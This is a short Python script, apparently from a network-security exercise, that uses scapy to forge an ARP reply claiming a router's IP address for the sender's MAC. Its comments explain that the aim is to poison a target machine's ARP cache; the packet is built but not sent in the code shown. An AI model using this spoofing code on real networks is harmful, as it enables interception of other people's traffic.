#!/usr/bin/env python

import scapy.all as scapy

packet = scapy.ARP(op=2, pdst="10.0.3.22", hwdst="08:00:27:72:d6:a1", psrc="10.0.3.1")
# op=2 means that this is arp response, we are spoofing a response! pdst is the packet destination, hwdst is the mac
# destination. psrc is packet source and this what we are forging, this is the router IP address. We are tricking the
# target machine into thinking our mac address is linked to the routers IP address i.e. we've poisoned the arp cache

